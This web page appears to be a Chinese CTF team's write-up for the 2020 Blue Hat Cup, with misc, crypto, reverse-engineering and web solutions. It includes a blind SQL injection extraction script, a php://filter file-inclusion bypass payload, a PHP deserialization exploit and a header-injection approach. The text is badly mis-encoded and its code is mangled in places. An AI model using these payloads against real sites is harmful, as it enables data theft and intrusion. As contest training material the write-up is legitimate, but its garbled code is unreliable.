<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
    <meta name="description" content="Lun4R|Nepnep|åŠ¡å†œ|å°èœé¸¡ä¸€æš|ddddhm|åˆä¹–åˆæ€‚.jpg">
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    çˆ†ç‚’è…°èŠ±-è“å¸½æ¯ |
    
    sharun&#39;s blogs</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="sharun's blogs" type="application/atom+xml">
</head>

<body>
<main class="content">
  <section class="outer">
  <article id="post-cnblog_13514165" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      
  
    <h1 class="article-title" itemprop="name">
      çˆ†ç‚’è…°èŠ±-è“å¸½æ¯
    </h1>
  
  




    </header>
    

    
    <div class="article-meta">
      <a href="/2020/08/16/cnblog_13514165/" class="article-date">
  <time datetime="2020-08-16T04:51:00.000Z" itemprop="datePublished">2020-08-16</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%AC%94%E8%AE%B0/">ç¬”è®°</a>
  </div>

    </div>
    

    
    
<div class="tocbot"></div>

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="è¿™æ˜¯ğŸ‘‰çˆ†ç‚’è…°èŠ±-è“å¸½æ¯ğŸ‘ˆçš„æ‘˜è¦"><a href="#è¿™æ˜¯ğŸ‘‰çˆ†ç‚’è…°èŠ±-è“å¸½æ¯ğŸ‘ˆçš„æ‘˜è¦" class="headerlink" title="è¿™æ˜¯ğŸ‘‰çˆ†ç‚’è…°èŠ±-è“å¸½æ¯ğŸ‘ˆçš„æ‘˜è¦"></a><a href="../../../../2020/08/16/cnblog_13514165/">è¿™æ˜¯ğŸ‘‰çˆ†ç‚’è…°èŠ±-è“å¸½æ¯ğŸ‘ˆçš„æ‘˜è¦</a></h1><a id="more"></a>
<p>æˆ‘ä»¬é˜Ÿæ‰€æœ‰åšå‡ºçš„é¢˜è§£éƒ½æ”¾å‡ºæ¥äº†ï¼Œæœ¬æ¥æƒ³å…ˆç ”ç©¶pythoné‚£é¢˜å†å‘çš„ã€‚ã€‚ç»“æœæ²¡å‡ºæ¥ ä¸€å®¶äººæ•´æ•´é½é½ &amp; äºŒè¿›åˆ¶çˆ·çˆ·ï¼Œä¸€é¢˜è¿›å¤èµ› # ç­¾åˆ°<br>gifåˆ†è§£å¸§ï¼Œå†çœ‹ä¸åŒè‰²åŸŸé€šé“ã€‚å¾—åˆ°flag # sudo åšå¯¹ä¹å®«æ ¼3æ¬¡ï¼Œåœ¨githubä¸Šæ‰¾åˆ°äº†ä¹å®«æ ¼ç®—æ³• <code>plain import numpy as np from pwn import * import time def solve(m): if isinstance(m, list): m = np.array(m) elif isinstance(m, str): m = np.loadtxt(m, dtype=np.int, delimiter=&quot;,&quot;) rg = np.arange(m.shape[0]+1) while True: mt = m.copy() while True: d = [] d_len = [] for i in range(m.shape[0]): for j in range(m.shape[1]): if mt[i, j] == 0: possibles = np.setdiff1d(rg, np.union1d(np.union1d(mt[i, :], mt[:, j]), mt[3*(i//3):3*(i//3+1), 3*(j//3):3*(j//3+1)])) d.append([i, j, possibles]) d_len.append(len(possibles)) if len(d) == 0: break idx = np.argmin(d_len) i, j, p = d[idx] if len(p) &gt; 0: num = np.random.choice(p) else: break mt[i, j] = num if len(d) == 0: break if np.all(mt != 0): break print(&quot;\nTrail:\n&quot;, mt) return mt def lllllll(): str1=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() p.recvline() p.recvline() print(str1) dataline = [] data = str1.split(&quot;\n&quot;) # print(data) for a in data: pp = a.split(&quot; &quot;) # print(pp) pp.remove(&#39;&#39;) #print(pp) if (pp != []): for i in range(0, 9): if (pp[i] == &#39;#&#39;): #print(pp[i]) pp[i] = &#39;0&#39; pp[i] = int(pp[i]) # print(pp) dataline.append(pp) print(dataline) result=solve(dataline) s=&#39;&#39; #solve = solve.tostring() for i in range(0,9): for j in range(0,9): s+=str(int(result[i][j])) #print(solve[i][j]), print(s) p.sendline(s) str1=&#39;&#39; time.sleep(3) if __name__ == &quot;__main__&quot;: p=remote(&quot;47.93.204.245&quot;,&quot;12000&quot;) i=0 while(i&lt;3): lllllll() i+=1 p.interactive() </code> # ç†Ÿæ‚‰çš„è§£å¯† base64éšå†™å’Œteaç®—æ³• <code>plain import re path = &#39;./1.txt&#39; b64char = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39; with open(path, &#39;r&#39;)as f: cipher = [i.strip() for i in f.readlines()] plaintext = &#39;&#39; for i in cipher: if i[-2] == &#39;=&#39;: # There are 4-bit hidden info while end with two &#39;=&#39; bin_message = bin(b64char.index(i[-3]))[2:].zfill(4) plaintext += bin_message[-4:] elif i[-1] == &#39;=&#39;: # There are 2-bit hidden info while end with one &#39;=&#39; bin_message = bin(b64char.index(i[-2]))[2:].zfill(2) plaintext += bin_message[-2:] plaintext = re.findall(&#39;.&#123;8&#125;&#39;, plaintext) # 8bits/group plaintext = &#39;&#39;.join([chr(int(i,2)) for i in plaintext]) print plaintext </code> ```plain #include  #include  //åŠ å¯†å‡½æ•° void encrypt(uint32_t* v,<br>uint32_t* k) { uint32_t v0 = v[0], v1 = v[1], sum = 0, i; /* set up <em>/<br>uint32_t delta = 0x9e3779b9; /</em> a key schedule constant <em>/ uint32_t k0 = k[0],<br>k1 = k[1], k2 = k[2], k3 = k[3]; /</em> cache key <em>/ for (i = 0; i &lt; 32; i++) { /</em><br>basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1</p>
<blockquote>
<blockquote>
<ol start="5">
<li><ul>
<li>k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); } /* end<br>cycle <em>/ v[0] = v0; v[1] = v1; } //è§£å¯†å‡½æ•° void decrypt(uint32_t</em> v, uint32_t* k)<br>{ uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; /* set up <em>/ uint32_t<br>delta = 0x9e3779b9; /</em> a key schedule constant <em>/ uint32_t k0 = k[0], k1 =<br>k[1], k2 = k[2], k3 = k[3]; /</em> cache key <em>/ for (i = 0; i &lt; 32; i++) { /*<br>basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);<br>v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; } /</em> end<br>cycle */ v[0] = v0; v[1] = v1; } int main() { //#cipher = [[4018289233L,<br>2950320151L], //[1771827478L, 493980876L], [1863284879L, 1137797599L],<br>//[2759701525L, 3957885055L], [2600866805L, 78850724L]] uint32_t v[2] = {<br>4018289233,2950320151}, //è¿™é‡Œè¦ä¸¤å¯¹ä¸¤å¯¹çš„åš k[4] = { 11,22,33,44 }; decrypt(v, k); //<br>vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ printf(â€œè§£å¯†åçš„æ•°æ®ï¼š%x%x\nâ€,<br>v[0], v[1]); return 0; } <code># WEBéƒ¨åˆ† ## easiestSQLI æµ‹è¯•ä¸€ä¸‹å‘ç°æ˜¯æ•°å­—å‹çš„ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨æ‹¬å·æ›¿æ¢ä¸€ä¸‹ï¼Œç„¶åé€ä¸ªæµ‹è¯•å­—ç¬¦å³å¯</code>plain import requests import string<br>import re r = requests.session() url =<br>â€˜<a target="_blank" rel="noopener" href="http://eci-2ze2wcynh47kqz8clurh.cloudeci1.ichunqiu.com//?id=(mid((select(flag)from(flag)),%7B0%7D,1)=char(%7B1%7D))&#39;">http://eci-2ze2wcynh47kqz8clurh.cloudeci1.ichunqiu.com//?id=(mid((select(flag)from(flag)),{0},1)=char({1}))&#39;</a><br>strings = string.printable for i in range(42): k = i + 1 for c in strings: res<br>= r.get(url.format(k,ord(j))) if re.findall(râ€™YES~â€™,res.content.decode()):<br>print(c,end=â€™â€™) break ``` ## æ–‡ä»¶åŒ…å«ç»•è¿‡<br>åˆ©ç”¨ä¼ªåè®®ï¼Œå‘ç°ä¸€èˆ¬çš„è¿‡æ»¤å™¨æ²¡æœ‰åŠæ³•ï¼Œç„¶åæ‰¾äº†ä¸€ä¸‹php://filterçš„å…¶ä»–æ“ä½œï¼Œå‘ç°å¯ä»¥ç”¨è¿™ä¸ªåè®®æ¥è·å–å­—ç¬¦ï¼Œå¾—åˆ°çš„ç»“æœæ¯ä¸¤ä¸ªé€†åºä¸€ä¸‹å³å¯<br>payloadï¼š<br>?filename=php://filter/convert.iconv.faUCS-2LE.UCS-2BE/resource=flag.php ##<br>Soitgoes æ–‡ä»¶åŒ…å«æ‹¿ä¸€ä¸‹æºç  ç±»æ–‡ä»¶åœ¨try.phpé‡Œé¢ï¼Œä¼ å‚ç‚¹åœ¨indexï¼Œå‘ç°ç±»ä¸­çš„å±æ€§æœ‰éšæœºç”Ÿæˆçš„å¹¶è¿›è¡Œæ¯”è¾ƒï¼Œåˆ©ç”¨å¼•ç”¨èµ‹å€¼ç»•è¿‡ã€‚</li>
</ul>
</li>
</ol>
</blockquote>
</blockquote>
<pre><code class="plain">$this-&gt;alize-&gt;getFlag(); &#125; &#125; class Flag&#123; public $f; public $t1; public $t2;
function __construct($file)&#123; echo &quot;Another construction!!&quot;; $this-&gt;f = $file;
$this-&gt;t1 = $this-&gt;t2 = md5(rand(1,10000)); &#125; public function getFlag()&#123;
$this-&gt;t2 = md5(rand(1,10000)); echo $this-&gt;t1; echo $this-&gt;t2; if($this-&gt;t1
=== $this-&gt;t2) &#123; if(isset($this-&gt;f))&#123; echo @highlight_file($this-&gt;f,true); &#125; &#125;
&#125; &#125; $b=new Flag(&#39;flag.php&#39;); $b-&gt;t1=&amp;$b-&gt;t2; $a=new Seri($b);
echo(serialize($a)); ?&gt; ```
![å›¾ç‰‡](https://uploader.shimo.im/f/sXG0FyVO2rzOMR2P.png!thumbnail) ## inclusion
è€ƒç‚¹æ˜¯å‚æ•°æ³¨å…¥ï¼Œä¸‹é¢æ˜¯æ¥æ›¿æ€è·¯ æ ¹æ®æç¤º.index.php.swpè·å–æºç ï¼Œå®¡è®¡ä¸€ä¸‹ å‘ç°X-Forwarded-Forå¤´å¯ä»¥ä½œä¸ºæ–‡ä»¶å¤¹åç§°ï¼Œè¿™å‚æ•°ç‚¹å¯æ§
å…³é”®ä»£ç  ```plain file_put_contents(&#39;res&#39;,print_r($_SERVER,true)); ```
å‘ç°å¯ä»¥åˆ©ç”¨æ—¥å¿—æ‰§è¡Œ/get_flag,æœ¬åœ°è°ƒè¯•å‘ç°å¯ä»¥è¿”å›ä¸€ç³»åˆ—ä¿¡æ¯ï¼Œé€‰æ‹©User-agentè¿›è¡Œæ³¨å…¥
![å›¾ç‰‡](https://uploader.shimo.im/f/5p7kA3Giyn9ReCnC.png!thumbnail) # é€†å‘
REæ˜¯äº›ä»€ä¹ˆç¥ä»™é¢˜å•Š jsé‚£ä¸ªå¥½åƒæ˜¯KCTFçš„åŸé¢˜ å·²ç»æ¢å¤OPCODEäº†ä½†æ˜¯æ—¶é—´ä¸å¤Ÿäº†ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯è¿·å®«é—®é¢˜ï¼Ÿ å°±åšäº†ä¸ªAPKè€Œä¸”å›°éš¾é‡é‡ï¼Œæˆ‘ç›´æ¥è£‚å¼€
å¤œç¥æ¨¡æ‹Ÿå™¨è·‘ä¸€ä¸‹ ![å›¾ç‰‡](https://uploader.shimo.im/f/d9e7AcH8AqlzdefP.png!thumbnail)
é¦–å…ˆå…ˆæŸ¥ä¸€ä¸‹çœ‹æ˜¯ä¸æ˜¯æœ‰å£³åŠ å›º
![å›¾ç‰‡](https://uploader.shimo.im/f/gvJA5bmUo6vKVitd.png!thumbnail) å¥½åƒæ²¡æœ‰ ç”¨ jadx
åˆ†æä¸€æ³¢ ![å›¾ç‰‡](https://uploader.shimo.im/f/yP9ySOjuHXDaZnTN.png!thumbnail)
![å›¾ç‰‡](https://uploader.shimo.im/f/MJzW0iln4fAEFz7A.png!thumbnail) å¤§è‡´çœ‹äº†ä¸€ä¸‹abc
ä¸‰ä¸ªå‡½æ•°æ— éæ˜¯HExè½¬åŒ–å•¥çš„ system.out.printlnæ‰“å°å‡ºçš„ç»“æœä¹Ÿæ˜¯åŠ å¯†çš„
9SKj8BfvJD5PcdH+Rh7TIbXwgpC/Nntiq62rWUEaAzQ3ZyVFG4mLoY0l1xOeMkus è¿™æ—¶å°±å¡ä½äº†
ç„¶åçœ‹äº†ä¸€ä¼šPWN å‘ç°ä¸ä¼šåˆå›æ¥äº† ä¹‹å‰åšç½‘é¼æ¯è¿˜æ˜¯å•¥æˆ‘è®°å¾—æœ‰ä¸€ä¸ªåŠ å¯†å‡½æ•°åœ¨NATIVEå±‚çš„ ç”¨JEBå¯¼å‡ºlibnative.soç„¶åç”¨IDAåˆ†æ
![å›¾ç‰‡](https://uploader.shimo.im/f/Rc0GmWmRMMTIyNts.png!thumbnail) ç»†å¿ƒæœç´¢å‘ç°å…³é”®å‡½æ•°
![å›¾ç‰‡](https://uploader.shimo.im/f/UoZyLShNtXsXT6Ry.png!thumbnail)
![å›¾ç‰‡](https://uploader.shimo.im/f/VR7NIkr0DAkt1Hga.png!thumbnail) çœ‹äº†ä¸€ä¸‹a å‡½æ•°
å¥½åƒæ˜¯ç”ŸæˆäºŒå‰æ ‘ï¼Œæˆ‘æ•°æ®ç»“æ„éƒ½å¿«å¿˜äº†ï¼ŒåˆèŠ±äº†ä¸€äº›æ—¶é—´å¤ä¹ ã€‚ã€‚æˆ–è®¸è¿™å°±æ˜¯èœé¸¡å§ ä¹‹åè¿›è¡Œä¸­åºéå†å’Œååºéå†ï¼Œæ¯”å¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœæ­£ç¡®ï¼Œå…ˆåºéå†åº”è¯¥å°±æ˜¯flag
å·²çŸ¥ä¸­åºéå†ç»“æœå’Œåç»­éå† å‚è€ƒ
[https://blog.csdn.net/BigData_Mining/article/details/81076069](https://blog.csdn.net/BigData_Mining/article/details/81076069)
00235CFPaeefijlmnrwz 020C5PaeeFlmnjzwrif3 ç®—å‡ºå‰ç»­éå† 3020fF5CeaPeirjnmlwz æˆ‘å¤ªèœäº†
è¿™é¢˜èŠ±äº†å¤ªå¤šæ—¶é—´ quickjs é‚£é¢˜å·²ç»å‚è€ƒKCTFé‚£é¢˜è¿˜åŸopcodeäº† æ²¡æ—¶é—´äº† QAQ # ZUC
å®‰è£…gmsslä¸€æŠŠæ¢­ï¼Œå°±å‡ºä¸€ä¸ªç®€å•cryæ˜¯çœ‹ä¸èµ·cryå—ï¼Ÿ
![å›¾ç‰‡](https://uploader.shimo.im/f/nfprRv9ZwbMs2oG6.png!thumbnail)

</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://sharun.xyz/2020/08/16/cnblog_13514165/" data-id="ckhagon5400262d3q094c6g4j" class="article-share-link">
        Share
      </a>
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E5%9B%AD/" rel="tag">åšå®¢å›­</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%90%AC%E5%AE%B6/" rel="tag">æ¬å®¶</a></li></ul>

    </footer>

  </div>

  
  
  <nav class="article-nav">
    
      <a href="/2020/08/16/cnblog_13514707/" class="article-nav-link">
        <strong class="article-nav-caption">Newer</strong>
        <div class="article-nav-title">
          
            HWSé€‰æ‹”èµ›-MISC
          
        </div>
      </a>
    
    
      <a href="/2020/07/26/cnblog_13381598/" class="article-nav-link">
        <strong class="article-nav-caption">Older</strong>
        <div class="article-nav-title">Lun4R-CyBRICSCTF wp</div>
      </a>
    
  </nav>


  

  
  
  
  

</article>
</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 sharun&#39;s blogs</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a target="_blank" rel="noopener" href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>
<aside class="sidebar">
  <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/hexo.svg" alt="sharun&#39;s blogs"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/gallery">Gallery</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="Search">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
</aside>

<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


  
<script src="/fancybox/jquery.fancybox.min.js"></script>




  
<script src="/js/tocbot.min.js"></script>

  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>



<script src="/js/ocean.js"></script>


</body>
</html>